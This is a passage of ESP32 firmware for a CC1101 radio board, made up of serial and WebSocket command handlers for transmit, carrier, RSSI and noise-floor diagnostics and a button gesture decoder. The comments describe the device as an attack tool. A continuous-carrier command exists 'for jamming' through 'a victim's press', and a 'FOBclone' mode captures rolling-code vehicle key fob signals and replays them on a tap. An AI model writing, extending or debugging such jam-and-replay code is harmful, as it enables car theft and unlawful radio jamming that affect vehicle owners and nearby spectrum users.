    // be left driven. It is also the ESP32-S3 boot strap, so never hold it as output.
    pinMode(PIN_GDO0,INPUT);
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    int verBefore=cc_readStatus(0x31);
    int marcIdle=cc_readStatus(0x35)&0x1F;           // MARCSTATE before
    SPI.endTransaction();

    // A short recognizable payload. Content is irrelevant to the question here;
    // what matters is that bytes move from FIFO to PA.
    static const uint8_t pl[8]={0xAA,0x55,0x0F,0xF0,0x12,0x34,0x56,0x78};
    bool sent=cc_txPacket(mhz,pl,sizeof(pl),0);

    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    int verAfter=cc_readStatus(0x31);
    int marcAfter=cc_readStatus(0x35)&0x1F;
    int txbytesAfter=cc_readStatus(0x3A)&0x7F;
    SPI.endTransaction();

    // Carrier test: does the PA run at all? 120 ms is long enough to catch on a
    // receiver or an SDR, short enough not to be antisocial on a shared band.
    bool carrier=cc_txCarrier(mhz,120);

    serialEmit(String("{\"cmd\":\"tx_fifo_test\",")+
      "\"freq\":"+String(mhz,3)+","+
      "\"cc1101_version\":\""+String(verBefore,HEX)+"\","+
      "\"version_after\":\""+String(verAfter,HEX)+"\","+
      "\"marcstate_before\":"+String(marcIdle)+","+
      "\"marcstate_after\":"+String(marcAfter)+","+
      "\"txbytes_after\":"+String(txbytesAfter)+","+
      "\"packet_sent\":"+String(sent?"true":"false")+","+
      "\"carrier_ok\":"+String(carrier?"true":"false")+","+
      "\"verdict\":\""+String(verBefore!=0x14?"CC1101_NOT_RESPONDING":
         (sent?"TX_FIFO_WORKING":(txbytesAfter>0?"TX_QUEUED_BUT_NOT_DRAINED":"TX_FAILED")))+"\","+
      "\"note\":\""+String(verBefore!=0x14
        ? "the CC1101 did not answer its version register, so nothing here is meaningful"
        : (sent
           ? "the chip drained its TX FIFO and returned to idle: packet-mode TX works without GDO0, so C1/C2 are not hardware-blocked"
           : (txbytesAfter>0
              ? "bytes remain in the TX FIFO: the chip did not go to TX, check MARCSTATE and the STX strobe"
              : "the FIFO drained but the transfer did not complete cleanly; watch for a carrier to confirm"))) +"\"}");
  }
  // {"cmd":"pa_check"} — what is actually in the PA table, and does it make an
  // OOK carrier at all?
  //
  // Why this matters: tx_fifo_test returned TX_FIFO_WORKING, but a drained FIFO only
  // proves the chip clocked bits out — not that the PA radiated. The card's own
  // scanner saw no local energy rise during six transmissions (all "weak",
  // -70..-79 dBm), which is the opposite of what a nearby transmitter should do.
  //
  // Suspect: the datasheet requires, for OOK, "the logic 0 and logic 1 power levels
  // shall be programmed to index 0 and 1 respectively". Our config writes 0x3E once
  // (single byte -> PATABLE[0] only) and FREND0=0x11 selects PA_POWER=1, i.e. index
  // 1, which was never programmed. It also notes PATABLE index 0 alone survives
  // SLEEP, and that reaching higher indices needs a BURST write.
  //
  // This reads the table back and reports the levels, so the next step is decided by
  // measurement rather than by another guess.
  else if(op=="pa_check"){
    uint8_t pa[8]={0};
    int frend0=0, pktctrl0=0, mdmcfg2=0;
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    frend0=cc_readReg(0x22);
    pktctrl0=cc_readReg(0x08);
    mdmcfg2=cc_readReg(0x12);
    // Burst-read the PATABLE: header 0x3E|0xC0, then 8 bytes.
    cc_cs(true); cc_waitMISO();
    cc_xfer(0x3E|0xC0);
    for(int i=0;i<8;i++) pa[i]=cc_xfer(0);
    cc_cs(false);
    SPI.endTransaction();
    int paPower=frend0&0x07;
    bool ookOn=((mdmcfg2&0x70)==0x30);         // MOD_FORMAT=011 -> ASK/OOK
    // With PA_POWER=1 and OOK, level 0 comes from index 0 and level 1 from index 1.
    uint8_t lvl0=pa[0], lvl1=pa[1];
    bool bothProgrammed=(lvl0!=0 && lvl1!=0);
    serialEmit(String("{\"cmd\":\"pa_check\",")+
      "\"frend0\":\""+String(frend0,HEX)+"\",\"pa_power\":"+String(paPower)+
      ",\"pktctrl0\":\""+String(pktctrl0,HEX)+"\","+
      "\"mdmcfg2\":\""+String(mdmcfg2,HEX)+"\",\"ook\":"+String(ookOn?"true":"false")+","+
      "\"patable\":\""+String(pa[0],HEX)+","+String(pa[1],HEX)+","+String(pa[2],HEX)+","+String(pa[3],HEX)+
      ","+String(pa[4],HEX)+","+String(pa[5],HEX)+","+String(pa[6],HEX)+","+String(pa[7],HEX)+"\","+
      "\"lvl0\":\""+String(lvl0,HEX)+"\",\"lvl1\":\""+String(lvl1,HEX)+"\","+
      "\"verdict\":\""+String(!ookOn?"NOT_OOK":
         (bothProgrammed?"PA_LEVELS_PRESENT":
          (lvl1==0?"OOK_LEVEL1_UNPROGRAMMED":"PA_LEVELS_LOW")))+"\","+
      "\"note\":\""+String(!ookOn
        ? "modulation is not OOK, so the two-level PA rule below does not apply"
        : (bothProgrammed
           ? "both OOK power levels are non-zero: the PA has something to transmit with, so a drained FIFO should mean real RF"
           : "OOK level 1 comes from PATABLE[1], which reads 0x00: a logic 1 would be transmitted at zero power, so the FIFO can drain with little or no RF radiated. Program PATABLE as a burst (levels 0 and 1) before trusting any TX result")) +"\"}");
  }
  // {"cmd":"tx_carrier_test","ms":1500} — hold a CONTINUOUS carrier, for jamming.
  //
  // Verified separately from tx_fifo_test on purpose: a single packet plus a 120 ms
  // carrier window is a weaker claim than holding a carrier through a victim's press.
  // C1's jam depends on the stronger one.
  //
  // Watch a receiver: this should look like steady energy at the frequency for the
  // whole duration, not a click. MARCSTATE is checked so the call cannot report
  // success without the chip actually entering TX.
  else if(op=="tx_carrier_test"){
    float mhz=jcmd.containsKey("freq")?(float)jcmd["freq"]:315.0f;
    int wantMs=jcmd.containsKey("ms")?(int)jcmd["ms"]:1500;
    if(wantMs<100) wantMs=100;
    if(wantMs>5000) wantMs=5000;
    pinMode(PIN_GDO0,INPUT);
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    int ver=cc_readStatus(0x31);
    int paBefore=cc_readReg(0x22)&0x07;
    SPI.endTransaction();
    // GROUND TRUTH: sample MARCSTATE/TXBYTES across a short carrier attempt and report
    // the sequence. Five attempts to reason about why TX was not held each produced
    // another hypothesis and another failure, so the state machine is now observed
    // rather than modelled.
    String trace="";
    {
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_setFreq(mhz);
      cc_writeReg(0x02,0x2E);
      cc_writeReg(0x12,0x30);
      cc_writeReg(0x08,0x00);
      cc_writeReg(0x06,255);
      cc_writeReg(0x10,0x48); cc_writeReg(0x11,0x65);
      cc_strobe(0x36); cc_strobe(0x3B);
      int mcs=cc_readReg(0x17);      // MCSM1: TXOFF_MODE decides the post-TX state
      SPI.endTransaction();
      txDiagMcsM1=mcs;
      uint8_t ones64[64]; for(int i=0;i<64;i++) ones64[i]=0xFF;
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_writeBurst(0x3F,ones64,64);
      cc_strobe(0x35);
      SPI.endTransaction();
      unsigned long t0=millis();
      while(millis()-t0<40){
        SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
        int m=cc_readStatus(0x35)&0x1F;
        int b=cc_readStatus(0x3A);
        SPI.endTransaction();
        trace+=String(m)+":"+String(b&0x7F)+(b&0x80?"U":"")+" ";
        delay(3);
      }
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_strobe(0x36); cc_strobe(0x3B);
      cc_writeReg(0x08,0x30); cc_writeReg(0x02,0x0D);
      cc_strobe(0x36); delay(1); cc_strobe(0x34);
      SPI.endTransaction();
    }
    unsigned long t0=millis();
    bool ok=cc_txCarrier(mhz,(uint16_t)wantMs);
    unsigned long held=millis()-t0;
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    int marcAfter=cc_readStatus(0x35)&0x1F;
    int txbytesAfter=cc_readStatus(0x3A)&0x7F;
    SPI.endTransaction();
    serialEmit(String("{\"cmd\":\"tx_carrier_test\",")+
      "\"freq\":"+String(mhz,3)+",\"requested_ms\":"+String(wantMs)+
      ",\"held_ms\":"+String(held)+","+
      "\"entered_tx\":"+String(ok?"true":"false")+","+
      "\"cc1101_version\":\""+String(ver,HEX)+"\","+
      "\"pa_power_before\":"+String(paBefore)+","+
      "\"marcstate_trace\":\""+trace+"\","+
      "\"mcsm1\":\""+String(txDiagMcsM1,HEX)+"\","+
      "\"marcstate_seen\":"+String(lastTxMarcState)+","+
      "\"fifo_underflow\":"+String(lastTxUnderflow?"true":"false")+","+
      "\"marcstate_after\":"+String(marcAfter)+","+
      "\"txbytes_after\":"+String(txbytesAfter)+","+
      "\"verdict\":\""+String(ver!=0x14?"CC1101_NOT_RESPONDING":
         (ok?"CARRIER_HELD":
          (lastTxUnderflow?"CARRIER_HAD_GAPS":
           ((lastTxMarcState==19||lastTxMarcState==20)?"TX_SEEN_NO_HOLD":"DID_NOT_ENTER_TX"))))+"\","+
      "\"note\":\""+String(ver!=0x14
        ? "the CC1101 did not answer, so nothing here is meaningful"
        : (ok
           ? "TX reached and the FIFO never underflowed, so the carrier ran unbroken for the requested time: a continuous jam is achievable without GDO0"
           : (lastTxUnderflow
              ? "the TX FIFO ran dry mid-carrier, so the transmission had gaps and is not a jam"
              : String("never reached TX; MARCSTATE was ")+String(lastTxMarcState)+
                " (19,20=TX  8=CALIBRATE  9-11=SETTLING  22=TXFIFO_UNDERFLOW)"))) +"\"}");
  }
  // {"cmd":"cap_diag","on":true|false} — per-stage capture diagnostics.
  // With it on, the next capture logs how many pulses survive each post-processing stage,
  // so a burst that empties out names the gate that dropped it instead of reporting only
  // "Too few edges". Off by default: it adds a log line per stage.
  else if(op=="cap_diag"){
    if(jcmd.containsKey("on")) lastCapDiag=(bool)jcmd["on"];
    else lastCapDiag=!lastCapDiag;
    serialEmit(String("{\"cmd\":\"cap_diag\",\"on\":")+String(lastCapDiag?"true":"false")+"}");
  }
  // {"cmd":"rssi_scope","f":315.0,"ms":2000} — what does the edge detector actually see?
  //
  // A capture either produces a report or "no-signal", and neither says *why*. This
  // samples cc_fastRSSI() at the capture loop's own rate for a window and reports the
  // distribution, the achieved poll rate, and how many excursions crossed a threshold.
  // That separates "the signal never crossed the threshold" from "it crossed but the
  // poller was too slow to catch the transitions".
  //
  // Receive-only. Pauses the sweep for the duration and restores it.
  else if(op=="rssi_scope"){
    bool wasScanS=scanActive; scanActive=false;
    float f=jcmd.containsKey("f")?(float)jcmd["f"]:315.0f;
    int ms=(int)(jcmd["ms"]|2000); if(ms<200)ms=200; if(ms>8000)ms=8000;
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_setFreq(f);
    cc_strobe(0x36); delay(1); cc_strobe(0x3A); delay(1); cc_strobe(0x34); delay(10);
    SPI.endTransaction();
    // settle, then take the floor the same way captureSignal does
    int lo=999, hi=-999; long sum=0; int n=0;
    int first[64]; int firstN=0;
    unsigned long t0=micros();    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    while((int)(micros()-t0) < ms*1000){
      int r=cc_fastRSSI();
      if(firstN<64) first[firstN++]=r;
      if(r<lo)lo=r; if(r>hi)hi=r; sum+=r; n++;
    }
    SPI.endTransaction();
    unsigned long elapsed=micros()-t0;
    // re-enter the shipping capture configuration
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_strobe(0x36); delay(1); cc_strobe(0x34);
    SPI.endTransaction();
    int avg = n? (int)(sum/n) : 0;
    // Optional explicit threshold, so the host can pass the floor measured in a quiet
    // window and have this window counted against it. Without it, the threshold is
    // derived from this window's own mean -- which the signal itself skews, and which
    // made an earlier version of this command report max=-21 dBm alongside zero
    // crossings. Measuring the floor and counting crossings must be separate passes.
    int edge = jcmd.containsKey("thr") ? (int)jcmd["thr"]
                                        : (avg + ((f>=309.0f&&f<=316.0f)?5:8));
    int trig = edge + 5;
    // Count runs, in this same pass, against that threshold. A "run" is a maximal span
    // of samples on the same side of the threshold; run lengths are what the capture
    // loop turns into pulses.
    long runs=0, runsGe100us=0, runsLt100us=0, above=0, maxRun=0;
    bool st=false, haveSt=false; long runLen=0;
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    unsigned long t1=micros();
    while((int)(micros()-t1) < ms*1000){
      int r=cc_fastRSSI();
      bool cur=(r>edge);
      if(!haveSt){ st=cur; haveSt=true; runLen=1; }
      else if(cur==st){ runLen++; }
      else {
        runs++;
        if(runLen>maxRun) maxRun=runLen;
        if(runLen>=100) runsGe100us++; else runsLt100us++;
        st=cur; runLen=1;
      }
      if(r>trig) above++;
    }
    if(haveSt){ runs++; if(runLen>=100) runsGe100us++; else runsLt100us++; if(runLen>maxRun) maxRun=runLen; }
    SPI.endTransaction();
    String s="[";
    for(int i=0;i<firstN;i++){ if(i)s+=","; s+=String(first[i]); }
    s+="]";
    serialEmit(String("{\"cmd\":\"rssi_scope\",\"freq\":")+String(f,2)+
      ",\"ms\":"+String(ms)+",\"samples\":"+String(n)+
      ",\"elapsed_us\":"+String((unsigned long)elapsed)+
      ",\"us_per_sample\":"+String(n?((float)elapsed/n):0.0f,2)+
      ",\"min\":"+String(lo)+",\"max\":"+String(hi)+",\"avg\":"+String(avg)+
      ",\"span\":"+String(hi-lo)+
      ",\"trig\":"+String(trig)+",\"edge\":"+String(edge)+
      ",\"runs\":"+String(runs)+
      ",\"runs_ge100us\":"+String(runsGe100us)+
      ",\"runs_lt100us\":"+String(runsLt100us)+
      ",\"max_run_samples\":"+String(maxRun)+
      ",\"above_trig_samples\":"+String(above)+
      ",\"first64\":"+s+"}");
    scanActive=wasScanS;
  }
  // {"cmd":"rx_floor_check"} — is the CC1101 actually in RX when the noise floor is
  // sampled, and is the figure comparable between modulations?
  //
  // Motivated by a real observation: a capture attempt reported
  //     Floor: -100 dBm  Trig: -90 / Edge: -95
  // while earlier working captures had Floor -65..-68. A -100 dBm floor is the value a
  // CC1101 returns when it is not receiving anything, so every threshold derived from it
  // is wrong by ~35 dB and no fob press can trigger a capture.
  //
  // Two suspects were tested and one was eliminated:
  //
  //   · Ordering. captureSignal() strobes SRX, then writes MDMCFG2 for FSK, then samples
  //     the floor. The datasheet says packet-handling fields should only be altered in
  //     IDLE, so the write might silently drop the chip out of RX. Measured: MARCSTATE
  //     stays 13 (RX) through the writes. The ordering is not the cause. (The strobes do
  //     need their settling gaps, which this command now matches captureSignal() on --
  //     see research/47.)
  //
  //   · AGCCTRL2.MAGN_TARGET. This is the cause, and it is not a fault: the same field
  //     value means different things in OOK and in FSK, because the datasheet gives
  //     MAGN_TARGET two different tables by modulation. The configuration carries the
  //     OOK value (3) into FSK, so the FSK figure is a different measurement, not a
  //     worse one. `magn_target_sweep_fsk` sweeps all eight values and shows the field
  //     moving the reading across ~15 dB, which is the evidence for that reading.
  //
  //     A fourth phase reading the floor with the chip in IDLE (MARCSTATE 5) was tried
  //     and removed: RSSI is not maintained in IDLE, so the register holds whatever the
  //     last RX left there and the samples jumped between -86 and -99 on consecutive
  //     runs. It looked like a clean control and was not one.
  //
  // Established: MARCSTATE stays 13 (RX) through the FSK writes, so the chip is
  // genuinely receiving; and a low FSK floor reflects the AGC target, not an idle
  // radio. See research/48.
  //
  // This reads MARCSTATE and RSSI at each step, so the answer is measured, not argued.
  else if(op=="rx_floor_check"){
    // Pause the sweep first. scanTick() runs after handleSerial() in loop() and
    // retunes/strobes SRX unconditionally, so with the scan active it clobbers this
    // measurement between the read and the average -- which made three identical runs
    // return three different floors, and two different verdicts.
    bool wasScanF=scanActive; scanActive=false;
    auto rssi=[]()->int{
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      int r=cc_fastRSSI();
      SPI.endTransaction();
      return r;
    };
    auto marc=[]()->int{
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      int m=cc_readStatus(0x35)&0x1F;
      SPI.endTransaction();
      return m;
    };
    auto floorAvg=[&](int n)->int{
      long s=0; for(int i=0;i<n;i++){ s+=rssi(); delayMicroseconds(500); }
      return (int)(s/n);
    };
    // Settle between strobes, exactly as captureSignal() does. Back-to-back strobes
    // leave SRX unlanded when MARCSTATE is read, so the chip still reports IDLE (1)
    // and the "floor" is then sampled on a radio that is not receiving.
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_setFreq(315.0f);
    cc_strobe(0x36); delay(1); cc_strobe(0x3A); delay(1); cc_strobe(0x34); delay(10);
    SPI.endTransaction();
    int mAfterSrx=marc();
    int fAfterSrx=floorAvg(24);
    // now the FSK writes, exactly as captureSignal does
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x12,0x00); cc_writeReg(0x15,0x47);
    SPI.endTransaction();
    int mAfterFsk=marc();
    int fAfterFsk=floorAvg(24);
    // Third phase: sweep AGCCTRL2.MAGN_TARGET across all eight values in FSK mode.
    // The CC1101 gives MAGN_TARGET two different tables, one for OOK/ASK and one for
    // 2-FSK/GFSK/MSK, so the same field value is not the same target in both modes.
    // The reference implementation in `reference sources/` states the rule directly:
    // "MAGN_TARGET for RX filter BW =< 100 kHz is 0x3. For higher RX filter BW's
    // MAGN_TARGET is 0x7." This board runs a 406 kHz filter with 0x3.
    String mtSweep="[";
    for(int mt=0;mt<8;mt++){
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_writeReg(0x1B,(uint8_t)(0x40|mt));   // same MAX_LNA/DVGA bits, MAGN_TARGET=mt
      SPI.endTransaction();
      int f=floorAvg(20);
      if(mt) mtSweep+=",";
      mtSweep+="{\"mt\":"+String(mt)+",\"floor_dbm\":"+String(f)+"}";
    }
    // restore the shipped value before anything else reads it
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x1B,0x43);
    SPI.endTransaction();
    mtSweep+="]";
    // and with an explicit re-entry into RX afterwards
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(10);
    SPI.endTransaction();
    int mReSrx=marc();
    int fReSrx=floorAvg(24);
    // leave it in the capture configuration
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x12,0x30); cc_writeReg(0x15,0x00);
    cc_strobe(0x36); delay(1); cc_strobe(0x34);
    SPI.endTransaction();
    serialEmit(String("{\"cmd\":\"rx_floor_check\",")+
      "\"after_srx\":{\"marcstate\":"+String(mAfterSrx)+",\"floor_dbm\":"+String(fAfterSrx)+"},"+
      "\"after_fsk_writes\":{\"marcstate\":"+String(mAfterFsk)+",\"floor_dbm\":"+String(fAfterFsk)+"},"+
      "\"after_re_srx\":{\"marcstate\":"+String(mReSrx)+",\"floor_dbm\":"+String(fReSrx)+"},"+
      "\"magn_target_sweep_fsk\":"+mtSweep+","+
      "\"verdict\":\""+String(mAfterFsk!=13?"FSK_WRITE_DROPS_RX":
         (fAfterFsk<-90?"FLOOR_UNREALISTIC":"OK"))+"\","+
      "\"note\":\""+String(mAfterFsk!=13
        ? "MARCSTATE is not RX (13) after the FSK register writes, so the noise floor is sampled on a radio that is not receiving"
        : (fAfterFsk<-90
           ? "the chip is in RX, but the floor is read with AGCCTRL2.MAGN_TARGET at its OOK value. That field selects a target from two different tables depending on modulation, so this figure is not comparable with the OOK one -- see magn_target_sweep_fsk"
           : "the chip stays in RX through the FSK writes and the floor is plausible"))+"\"}");
    scanActive=wasScanF;
  }
  // {"cmd":"rssi_path_check"} — are the two RSSI read paths in agreement?
  //
  // cc_fastRSSI() skips cc_waitMISO(), unlike every other read. The CC1101 requires
  // CSn low then a wait for SO (CHIP_RDYn) before the header byte, except when already
  // in SLEEP/XOFF (datasheet 10.1). Skipping it may clock the header before the chip is
  // ready, returning an undefined value — plausible-looking but wrong.
  //
  // That would explain a noise floor of -92 dBm where the same code read -65 earlier,
  // and why every threshold derived from it is then ~25 dB too high to trigger on a fob.
  // This reads the same register both ways, repeatedly, and reports the pair.
  else if(op=="rssi_path_check"){
    // Same two faults as rx_floor_check above, and the same fixes: pause the sweep so
    // scanTick() cannot retune between reads, and settle between strobes so SRX lands
    // before the RSSI register is sampled. The retune matters most here -- this command
    // averages 40 paired reads over ~32 ms, which is long enough for a sweep tick to
    // land in the middle of it.
    bool wasScanR=scanActive; scanActive=false;
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_setFreq(315.0f);
    cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(10);
    SPI.endTransaction();
    long fastSum=0, safeSum=0; int nFast=0,nSafe=0;
    int fastMin=999,fastMax=-999,safeMin=999,safeMax=-999;
    for(int i=0;i<40;i++){
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      int f=cc_fastRSSI();                  // no CHIP_RDYn wait
      SPI.endTransaction();
      int sf=cc_rssi();                     // cc_readStatus -> waits
      fastSum+=f; nFast++; if(f<fastMin)fastMin=f; if(f>fastMax)fastMax=f;
      safeSum+=sf; nSafe++; if(sf<safeMin)safeMin=sf; if(sf>safeMax)safeMax=sf;
      delayMicroseconds(800);
    }
    int fastAvg=(int)(fastSum/nFast), safeAvg=(int)(safeSum/nSafe);
    int diff=fastAvg-safeAvg; if(diff<0) diff=-diff;
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_strobe(0x36); delay(1); cc_strobe(0x34);
    SPI.endTransaction();
    serialEmit(String("{\"cmd\":\"rssi_path_check\",")+
      "\"fast_no_wait_avg\":"+String(fastAvg)+",\"fast_range\":["+String(fastMin)+","+String(fastMax)+"],"+
      "\"safe_wait_avg\":"+String(safeAvg)+",\"safe_range\":["+String(safeMin)+","+String(safeMax)+"],"+
      "\"diff_db\":"+String(diff)+","+
      "\"verdict\":\""+String(diff>=4?"PATHS_DISAGREE":"PATHS_AGREE")+"\","+
      "\"note\":\""+String(diff>=4
        ? "the two read paths differ by 4 dB or more: one of them is not reading the RSSI register correctly, and the noise floor is only as trustworthy as the path that measured it"
        : "both paths agree, so the floor reading is not a read-path artefact")+"\"}");
    scanActive=wasScanR;
  }
  // {"cmd":"headless","on":true|false}  — start/stop standalone headless scan
  // Omit "on" to toggle.
  else if(op=="headless"){
    if(jcmd.containsKey("on")){
      bool want=(bool)jcmd["on"];
      if(want != headlessActive) toggleHeadlessScan();
    } else {
      toggleHeadlessScan();
    }
    serialEmit(String("{\"cmd\":\"headless\",\"active\":")+
      (headlessActive?"true":"false")+",\"ok\":true}");
  }
  // {"cmd":"freq_preset","idx":0|1|2}  — set frequency preset for headless scan
  //   0 = NA (300-320 MHz)  1 = EU (433-435 MHz)  2 = ALL (300-928 MHz)
  // Omit "idx" to cycle to the next preset.
  else if(op=="freq_preset"){
    if(jcmd.containsKey("idx")){
      int pi=(int)jcmd["idx"];
      if(pi>=0 && pi<N_PRESETS) freqPresetIdx=pi;
      else freqPresetIdx=(freqPresetIdx+1)%N_PRESETS;
    } else {
      freqPresetIdx=(freqPresetIdx+1)%N_PRESETS;
    }
    hsPrefs.begin("hslib",false);
    hsPrefs.putUChar("preset",freqPresetIdx);
    hsPrefs.end();
    serialEmit("{\"cmd\":\"freq_preset\",\"ok\":true,\"idx\":"+String(freqPresetIdx)+
      ",\"name\":\""+String(FREQ_PRESETS[freqPresetIdx].name)+
      "\",\"sMin\":"+String(FREQ_PRESETS[freqPresetIdx].sMin,1)+
      ",\"sMax\":"+String(FREQ_PRESETS[freqPresetIdx].sMax,1)+"}");
  }
  // {"cmd":"hs_clear"}  — erase all headless-captured signals from NVS
  else if(op=="hs_clear"){
    hsLib_clear();
    serialEmit("{\"cmd\":\"hs_clear\",\"ok\":true}");
  }
  // {"cmd":"hs_list"}  — re-emit all headless library signals to both dashboards
  else if(op=="hs_list"){
    hsLib_emitAll();
    serialEmit("{\"cmd\":\"hs_list\",\"ok\":true}");
  }
  // {"cmd":"fobclone_scan","on":true|false}  — start/stop FOBclone headless mode
  // Omit "on" to toggle.  FOBclone headless watches auto-captures for rolling-code
  // vehicle fobs; single-tap to replay when the device signals ready.
  else if(op=="fobclone_scan"){
    if(jcmd.containsKey("on")){
      bool want=(bool)jcmd["on"];
      if(want != hfcActive) toggleFobcloneScan();
    } else {
      toggleFobcloneScan();
    }
    serialEmit(String("{\"cmd\":\"fobclone_scan\",\"active\":")+
      (hfcActive?"true":"false")+",\"state\":"+String(hfcState)+",\"ok\":true}");
  }
}

// Drain commands the WebSocket handler queued, on the loop() task. Called every loop()
// next to handleSerial(). Bounded work per pass so a flood of WS commands cannot starve
// the rest of loop() (capture, scan, the sequencers).
static void wsPump(){
  int n=0;
  while(wsQHead!=wsQTail && n<WS_CMD_Q){
    String line(wsQ[wsQHead]);
    int from=wsQFrom[wsQHead];
    uint32_t fromGen=wsQGen[wsQHead];
    wsQHead=(wsQHead+1)%WS_CMD_Q;
    // serialEmit() routes the reply to this slot instead of broadcasting it. Serial callers
    // leave it at -1, which restores the broadcast path for those events. The generation is
    // restored too: if the client left and its slot was taken while this command waited, the
    // generation no longer matches and wsSendToSlot() drops the reply rather than misdelivering.
    wsReplyTo=from;
    wsReplyToGen=fromGen;
    processCommandLine(line);
    wsReplyTo=-1;
    wsReplyToGen=0;
    n++;
  }
}

void handleSerial(){
  while(Serial.available()){
    char ch=Serial.read();
    if(ch=='\n'||ch=='\r'){
      String ln=serialInBuf; serialInBuf=""; ln.trim();
      if(ln.length()<3||ln[0]!='{') continue;
      // Dispatch through the shared handler, which the WiFi WebSocket path also calls,
      // so a command behaves identically on either transport.
      processCommandLine(ln);
    } else {
      // A completed line must fit, or the command is DISCARDED SILENTLY: the cap drops the
      // tail, the JSON never closes, deserializeJson fails, and handleSerial() `continue`s
      // without emitting anything. Found on the bench -- a 280-pulse fbk_import (~1.5 KB)
      // produced no reply at all, while 40 pulses (248 chars) worked. Measured threshold:
      // 248 chars replies, 264 chars is silent.
      //
      // SERIAL_CMD_MAX is sized for the largest command this firmware accepts. The import's
      // pulse list is the widest: SUB_REPLAY_MAX_PULSES (3740) worst-case 5-digit values
      // would be ~19 KB, which is more than is sane to hold as a String, so the serial import
      // is documented as accepting a bounded payload (see the fbk_import handler's limit
      // note) rather than silently truncating. 8 KB covers every other command with margin.
      if(serialInBuf.length()<SERIAL_CMD_MAX) serialInBuf+=ch;
      else if(serialInBuf.length()==SERIAL_CMD_MAX){
        // Report the overflow ONCE rather than dropping the line in silence -- a discarded
        // command that produces no output is the defect this bound used to cause.
        serialEmit(String("{\"ok\":false,\"error\":\"serial-line-too-long\",\"max_bytes\":")+
                   String(SERIAL_CMD_MAX)+"}");
        serialInBuf+='\0';   // sentinel: stop accumulating, and stop repeating the warning
      }
    }
  }
}


// ─── Power Management ─────────────────────────────────────────────────────────
// ─── Button handler — tap-counting gesture decoder ────────────────────────────
// Called every loop().  Uses three static state vars: btnDown (shared global),
// btnHoldFired, btnTapCnt, btnLastUp (declared in the globals block above).
//
// Gestures, matching the branch below:
//   Single tap  → FOBclone replay if that mode is ready, band step if it is scanning,
//                 otherwise toggle FOBscan headless
//   Two or more → toggle FOBclone headless
//   Hold ≥3 s   → doPowerOff() (sound + fade, light sleep, 3 s hold to wake)
void checkButton(){
  bool pressed = (digitalRead(PIN_BTN) == LOW);
  unsigned long now = millis();

  if(pressed){
    if(btnDown == 0){ btnDown = now; btnHoldFired = false; }
    unsigned long held = now - btnDown;
    // Visual hold-progress: LED fades from idle → bright red over 500–3000 ms
    if(held > 500 && held < 3000 && !btnHoldFired){
      int p = constrain((int)map(held, 500, 3000, 0, 255), 0, 255);
      setLed(p, 0, 0);
    }
    // Fire power-off at 3 s
    if(held >= 3000 && !btnHoldFired){
      btnHoldFired = true; btnTapCnt = 0;
      doPowerOff();   // blocks until power is back on
    }
  } else {
    // Button released
    if(btnDown > 0 && !btnHoldFired){
      unsigned long held = now - btnDown;
      if(held >= 30 && held < 1500){   // valid tap (not noise, not hold)
        btnTapCnt++;
        btnLastUp = now;
        // Immediately restore LED so user sees the hold-progress bar clear
        if(hfcActive)           setLed(0, 20, 200);
        else if(headlessActive) setLed(255, 80, 0);
        else                    setLed(0, 150, 65);
      }
    }
    btnDown = 0; btnHoldFired = false;
  }

  // Resolve gesture after 400 ms of quiet
  if(btnTapCnt > 0 && now - btnLastUp > 400){
    if(btnTapCnt == 1){
      // Context-sensitive single tap:
      //   FOBclone ready  → replay (primary action the user is waiting for)
      //   FOBclone active → cycle freq preset (adjust band while scanning)
      //   Otherwise       → toggle FOBscan headless
      if(hfcActive && hfcState == HFC_READY) hfc_doReplay();
      else if(hfcActive)                     cycleFreqPreset();
      else                                   toggleHeadlessScan();
    } else {
      toggleFobcloneScan();  // 2+ taps = FOBclone headless toggle
    }
    btnTapCnt = 0;
  }
}

// ─── Setup ────────────────────────────────────────────────────────────────────
// RF always enabled (open build)

void setup(){
  // The ESP32's default UART RX buffer is 256 bytes, so a longer line than that overflows
  // the driver's buffer BEFORE handleSerial() ever sees it -- the command is lost with no
  // output, independently of the 255-char cap handleSerial() used to apply. Both limits had
  // to move: measured on the bench, a 248-char line worked and 264 chars was silent, and
  // after raising the software cap a 488-char line was STILL silent because of this one.
  // setRxBufferSize() must be called before begin() to take effect.
  // Report what the queue ACTUALLY became: setRxBufferSize returns the size it achieved,
  // or 0 on failure, and the CDC begin() silently falls back to 256 if the queue was never
  // created. Measured on the bench, a 889-char line worked and 1050 was silent -- a ~1 KB
  // boundary, not the 8192 requested -- so the return value is logged rather than assumed.
  { size_t got=Serial.setRxBufferSize(SERIAL_CMD_MAX);
